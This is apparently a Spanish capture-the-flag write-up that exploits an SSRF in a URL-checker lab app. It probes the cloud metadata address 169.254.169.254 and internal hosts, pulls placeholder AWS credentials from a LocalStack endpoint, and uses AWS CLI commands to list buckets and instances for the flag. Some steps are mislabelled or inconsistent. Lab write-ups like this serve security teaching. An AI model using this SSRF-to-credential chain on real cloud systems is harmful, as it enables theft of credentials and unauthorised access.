#### **Paso 1: Analizar**
- Accede a la aplicación en `http://34.51.13.20:8080/`.
- Observa que hay un formulario que permite ingresar una URL y verificar su contenido.
- Este ultimo es vulnerable a Server-Side Request Forgery (SSRF)
- En el URL checker, ponermos http://169.254.169.254/latest/meta-data/ lo que comunmente es el vector de entrada de esta vuln.
- Al acceder nos da la siguiente pista
  
  ![image](https://github.com/user-attachments/assets/07ee8a90-8731-41e3-9f2c-895f4c3673f4)



#### **Paso 2: Identificar la vulnerabilidad**
- Sospecha que la aplicación puede ser vulnerable a **Server-Side Request Forgery (SSRF)** porque toma una URL ingresada por el usuario y hace una solicitud HTTP a esa URL.
- Para confirmar, intenta acceder a recursos internos, como:
  - `http://localhost:8080` (la propia aplicación).
  - `http://127.0.0.1:8080` (alternativa a localhost).
  - `http://34.51.13.20:8080/latest/meta-data/` (el servicio de metadata simulado en la aplicación).

#### **Paso 3: Confirmar el SSRF**
- Ingresa la URL `http://34.51.13.20:8080/latest/meta-data/` en el formulario.
- Si la aplicación devuelve información del servicio de metadata de AWS, confirma que es vulnerable a SSRF.

---

### **2. Explotación**

Una vez confirmada la vulnerabilidad, el pentester explota el SSRF para obtener credenciales de AWS.

#### **Paso 1: Obtener credenciales de AWS**
- Ingresa la URL del servicio de metadata de AWS en el formulario:
  ```
  http://34.51.13.20:4566/bucket-ahau-yucatan/users.txt
  ```
- La aplicación devuelve las credenciales en formato JSON:
  ```json
  {
      "AccessKeyId": "test",
      "SecretAccessKey": "test",
      "Token": "test",
      "Region": "us-east-1"
  }
  ```

#### **Paso 2: Configurar las credenciales**
- Usa las credenciales obtenidas para configurar el entorno de AWS CLI:
  ```bash
  export AWS_ACCESS_KEY_ID=test
  export AWS_SECRET_ACCESS_KEY=test
  export AWS_SESSION_TOKEN=test
  export AWS_DEFAULT_REGION=us-east-1
  ```

---

### **3. Post-Explotación**

Con las credenciales en mano puedes interactúa con los servicios de AWS (LocalStack) para encontrar la bandera.

#### **Paso 1: Listar los buckets de S3**
- Usa el siguiente comando para listar los buckets en S3:
  ```bash
  aws --endpoint-url=http://34.51.13.20:4566 s3 ls
  ```
- Observa que hay un bucket llamado `secret-bucket-challenge`.

#### **Paso 2: Listar los archivos en el bucket**
- Usa el siguiente comando para listar los archivos en el bucket:
  ```bash
  aws --endpoint-url=http://34.51.13.20:4566 s3 ls s3://secret-bucket-challenge/
  ```
- Observa que hay un archivo llamado `flag.txt`.

### **Paso 3: Listar las instancias EC2**  

1. Ver las instancias EC2 ejecutando el siguiente comando:  

   ```bash
   aws --endpoint-url=http://34.51.13.20:4566 ec2 describe-instances \
     --query "Reservations[*].Instances[*].Tags[?Key=='Name'].Value" \
     --output text
   ```

2. La bandera es el nombre de la instancia encontrada:  

   ```
   FEMEC_Pentester_Cloud_AHAU
   ```

---


By M0r0k0
